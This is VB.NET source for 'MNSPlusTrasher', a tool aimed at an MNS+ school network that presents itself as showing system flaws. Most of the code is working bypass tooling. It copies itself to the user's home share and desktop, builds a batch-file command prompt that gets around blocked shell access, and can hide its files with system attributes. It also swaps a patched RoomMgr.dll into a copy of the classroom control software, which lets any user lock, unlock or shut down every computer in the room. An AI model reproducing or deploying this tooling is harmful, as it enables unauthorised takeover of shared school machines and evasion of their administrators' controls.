﻿Imports System.Net

Public Class Form
    Public Sub RunCommandCom(arguments As String)
        Dim p As Process = New Process()
        Dim pi As ProcessStartInfo = New ProcessStartInfo()
        pi.Arguments = " " + arguments
        pi.FileName = "fsutil.exe"
        p.StartInfo = pi
        p.Start()
    End Sub

    Dim wshShell = CreateObject("WScript.Shell")
    Dim objnet = CreateObject("WScript.Network")
    Dim objFSO = CreateObject("Scripting.FileSystemObject")
    Dim user = objnet.UserName

    'Serverroles
    Dim Fileserver = "\\MNSPlusFile\"

    'Shares
    Dim PrivatHome = Fileserver & user & "$"             'Privat Homeshare
    Dim PublicLehrer = Fileserver & user & "Public" & "$"        'Public Homeshare Lehrer

    Private Sub Form_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.TopMost = True
        If (Process.GetCurrentProcess().ProcessName = "TeacherConsole") Then
            Black.Show()
            Title.Text = Title.Text + " [Blackout]"
        Else
            If Not Debugger.IsAttached Then
                On Error Resume Next
                'Copy to PrivatHome
                Dim Location = System.Reflection.Assembly.GetExecutingAssembly().CodeBase.Remove(0, 8), DesktopPath = Strings.Replace(wshShell.SpecialFolders("Desktop"), "\", "/"), Name = "\" + Process.GetCurrentProcess().ProcessName + ".exe"
                If (objFSO.FileExists(PrivatHome + Name)) Then
                    objFSO.DeleteFile(PrivatHome + Name, True)
                End If
                Microsoft.VisualBasic.FileIO.FileSystem.CopyFile(Location, PrivatHome + Name)
                'Copy to Desktop
                If Not Strings.Left(Location, Location.Length - Name.Length) = DesktopPath Then
                    If (objFSO.FileExists(DesktopPath + Name)) Then
                        objFSO.DeleteFile(DesktopPath + Name, True)
                    End If
                    Microsoft.VisualBasic.FileIO.FileSystem.CopyFile(Location, DesktopPath + Name)
                    Process.Start(DesktopPath & Name)
                    Process.GetCurrentProcess.Kill()
                End If
            End If

            MsgBox(
  " MNS+ Trasher for MGM-Monschau
    MNSPlusTrasher is designed to show flaws in systems using MNS+
    Copyright (C) 2019  Bastian Oliver Schwickert

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see 
    <https://www.gnu.org/licenses/>.", vbOKOnly, "MNSPlusTrasher")
        End If
    End Sub

    Private Sub MGMBtn_Click(sender As Object, e As EventArgs) Handles MGMBtn.Click
        If LSD.IsHandleCreated Then
            LSD.Close()
        Else
            LSD.Show()
        End If
    End Sub

    Private Sub Schülermodul_Click(sender As Object, e As EventArgs)
        Process.Start("Http://mnsplusweb:81/schuelermodul/default.aspx")
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs)
        Process.Start("Http://mnsplusweb:81/main/index.aspx")
    End Sub

    Private Sub Wall_Click(sender As Object, e As EventArgs) Handles Wall.Click
        WallpaperChanger.Show()
    End Sub

    Private Sub Volume_Click(sender As Object, e As EventArgs) Handles Volume.Click
        Process.Start("sndvol.exe")
    End Sub

    Private Sub PowerShell_Click(sender As Object, e As EventArgs) Handles PowerShell.Click
        Dim DesktopPath = wshShell.SpecialFolders("Desktop")
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("color 17")
        sb.AppendLine("title PowerShell")
        sb.AppendLine("powershell")
        If objFSO.FileExists(DesktopPath & "\PowerSH.cmd") Then
            objFSO.DeleteFile(DesktopPath & "\PowerSH.cmd")
        End If
        IO.File.WriteAllText(DesktopPath & "\PowerSH.cmd", sb.ToString())
        If Silent.Checked = True Then
            IO.File.SetAttributes(DesktopPath & "\PowerSH.cmd", IO.FileAttributes.Hidden Or
                                  IO.FileAttributes.System)
        End If
        Process.Start(DesktopPath & "\PowerSH.cmd")
    End Sub

    Private Sub BlackBtn_Click(sender As Object, e As EventArgs) Handles MGMBtn.Click
        If (Process.GetCurrentProcess().ProcessName = "TeacherConsole") Then
            If Black.IsHandleCreated Then
                Black.Close()
            Else
                Black.Show()
            End If
        Else
            If MsgBox("This Will End This Instance Of MNSPlusTrasher!
Do You Want To Proceed?", 48 + 1, "Warning!") = MsgBoxResult.Ok Then
                Black.Show()
            End If
        End If
    End Sub

    Private Sub LSDbtn_Click(sender As Object, e As EventArgs) Handles LSDbtn.Click
        If LSD.IsHandleCreated Then
            LSD.Close()
        Else
            LSD.Show()
        End If
    End Sub



    Private Sub MapPublicLehrer_Click(sender As Object, e As EventArgs)
        If objFSO.FolderExists("L:") Then
            objnet.RemoveNetworkDrive("L:")
        Else
            objnet.MapNetworkDrive("L:", PublicLehrer, False)
        End If
    End Sub

    Private Sub MapPrivatHome_Click(sender As Object, e As EventArgs)
        If objFSO.FolderExists("H:") Then
            objnet.RemoveNetworkDrive("H:")
        Else
            objnet.MapNetworkDrive("H:", PrivatHome, False)
        End If
    End Sub

    Private Sub CMD_Click(sender As Object, e As EventArgs) Handles CMD.Click
        Dim DesktopPath = wshShell.SpecialFolders("Desktop")
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cls")
        sb.AppendLine("title Command Prompt     [Bypass by Bastian Oliver Schwickert]")

        If Not (IO.Directory.Exists(PrivatHome + "\PATH\")) Then
            If MsgBox("Do you want to add " + PrivatHome + "\PATH\ to the PATH?", 32 + 4, "Add to the PATH") = MsgBoxResult.Yes Then
                Try
                    IO.Directory.CreateDirectory(PrivatHome + "\PATH\")
                    sb.AppendLine("set PATH=%path%;" + PrivatHome + "\PATH\")
                Catch ex As Exception
                    MsgBox(ex.Message, 16, "ERROR!")
                End Try
            End If
        Else
            sb.AppendLine("set PATH=%path%;" + PrivatHome + "\PATH\")
        End If

        sb.AppendLine("for /f ""tokens=4* delims=. "" %%i in ('ver') do set VERSION=%%i.%%j")
        sb.AppendLine("echo Microsoft Windows [Version %version%")
        sb.AppendLine("echo (c) 2018 Microsoft Corporation. All rights reserved.")
        sb.AppendLine("echo.")
        sb.AppendLine("set command=")
        sb.AppendLine(":start")
        sb.AppendLine("%command%")
        sb.AppendLine("if not ""%command%""=="""" echo.")
        sb.AppendLine("set command=")
        sb.AppendLine("SET /P command=%cd%^>")
        sb.AppendLine("goto :start")
        If objFSO.FileExists(DesktopPath & "\CMD.cmd") Then
            objFSO.DeleteFile(DesktopPath & "\CMD.cmd")
        End If
        IO.File.WriteAllText(DesktopPath & "\CMD.cmd", sb.ToString())
        If Silent.Checked = True Then
            IO.File.SetAttributes(DesktopPath & "\CMD.cmd", IO.FileAttributes.Hidden Or
                                  IO.FileAttributes.System)
        End If
        Process.Start(DesktopPath & "\CMD.cmd")
    End Sub

    Private Sub LockPCBtn_Click(sender As Object, e As EventArgs) Handles LockPCBtn.Click
        Dim DesktopPath = wshShell.SpecialFolders("Desktop"), Response
        PatchRoomMgr()
        Response = MsgBox("Do you really want to lock all computers in your room?", vbYesNo, "Lock Current Room")
        If Response = vbYes Then
            Process.Start(DesktopPath & "\MNS Fernsteuerung.net\MNSInterface.exe", "/refreshlist")
            Threading.Thread.Sleep(1000)
            Process.Start(DesktopPath & "\MNS Fernsteuerung.net\MNSInterface.exe", "/lockscreen")
        End If
    End Sub

    Private Sub UnlockPCBtn_Click(sender As Object, e As EventArgs) Handles UnlockPCBtn.Click
        Dim DesktopPath = wshShell.SpecialFolders("Desktop"), Response
        PatchRoomMgr()
        Response = MsgBox("Do you really want to unlock all computers in your room?", vbYesNo, "Unlock Current Room")
        If Response = vbYes Then
            Process.Start(DesktopPath & "\MNS Fernsteuerung.net\MNSInterface.exe", "/refreshlist")
            Threading.Thread.Sleep(1000)
            Process.Start(DesktopPath & "\MNS Fernsteuerung.net\MNSInterface.exe", "/unlock")
        End If
    End Sub

    Private Sub ShutdownPCBtn_Click(sender As Object, e As EventArgs) Handles ShutdownPCBtn.Click
        Dim DesktopPath = wshShell.SpecialFolders("Desktop"), Response
        PatchRoomMgr()
        Response = MsgBox("Do you really want to shutdown all computers in your room?", vbYesNo, "Shutdown Current Room")
        If Response = vbYes Then
            Process.Start(DesktopPath & "\MNS Fernsteuerung.net\MNSInterface.exe", "/refreshlist")
            Threading.Thread.Sleep(1000)
            Process.Start(DesktopPath & "\MNS Fernsteuerung.net\MNSInterface.exe", "/unlock")
            Threading.Thread.Sleep(1000)
            Process.Start(DesktopPath & "\MNS Fernsteuerung.net\MNSInterface.exe", "/shutdown")
        End If
    End Sub

    Private Sub PatchTC_Click(sender As Object, e As EventArgs) Handles PatchTCBtn.Click
        Dim DesktopPath = wshShell.SpecialFolders("Desktop"), Response
        PatchRoomMgr()
        Response = MsgBox("Run TeacherConsole.exe?", vbYesNo, "TCPatcher")
        If Response = vbYes Then
            Process.Start(DesktopPath & "\MNS Fernsteuerung.net\TeacherConsole.exe")
        End If
    End Sub

    Private Sub PatchRoomMgr()
        Dim FernsteuerungDir = My.Computer.FileSystem.SpecialDirectories.ProgramFiles + "\MNS Fernsteuerung.net"
        Dim DesktopPath = wshShell.SpecialFolders("Desktop"), Response
        If Not (objFSO.FolderExists(DesktopPath & "\MNS Fernsteuerung.net")) Then
            Microsoft.VisualBasic.FileIO.FileSystem.CreateDirectory(DesktopPath & "\MNS Fernsteuerung.net")
            If Silent.Checked = True Then
                IO.File.SetAttributes(DesktopPath & "\MNS Fernsteuerung.net", IO.FileAttributes.Hidden Or
                                  IO.FileAttributes.System)
            End If
        End If
        On Error Resume Next
        Microsoft.VisualBasic.FileIO.FileSystem.CopyDirectory(FernsteuerungDir, DesktopPath & "\MNS Fernsteuerung.net")
        Microsoft.VisualBasic.FileIO.FileSystem.RenameFile(DesktopPath & "\MNS Fernsteuerung.net\RoomMgr.dll", "RoomMgr.dll.orig")
        Microsoft.VisualBasic.FileIO.FileSystem.WriteAllBytes(DesktopPath & "\MNS Fernsteuerung.net\RoomMgr.dll", My.Resources.ResourceManager.GetObject("RoomMgr"), True)
    End Sub

    Private Sub CloseBtn_Click(sender As Object, e As EventArgs) Handles CloseBtn.Click
        Close()
    End Sub

    Private Sub MinimizeBtn_Click(sender As Object, e As EventArgs) Handles MinimizeBtn.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub DashboardBtn_Click(sender As Object, e As EventArgs) Handles DashboardBtn.Click
        Shares.Close()
        Info.Close()
    End Sub

    Private Sub SharesBtn_Click(sender As Object, e As EventArgs) Handles SharesBtn.Click
        With Shares
            .TopLevel = False
            MainPanel.Controls.Add(Shares)
            .BringToFront()
            .Show()
        End With
    End Sub

    Private Sub InfoBtn_Click(sender As Object, e As EventArgs) Handles InfoBtn.Click
        With Info
            .TopLevel = False
            MainPanel.Controls.Add(Info)
            .BringToFront()
            .Show()
        End With
    End Sub

    Private Sub SilentLbl_Click(sender As Object, e As EventArgs) Handles SilentLbl.Click
        If Silent.Checked Then
            Silent.Checked = False
        Else
            Silent.Checked = True
            Silent.Select()
        End If
    End Sub

    Private Sub ProcessesBtn_Click(sender As Object, e As EventArgs) Handles ProcessesBtn.Click
        Processes.Show()
    End Sub
End Class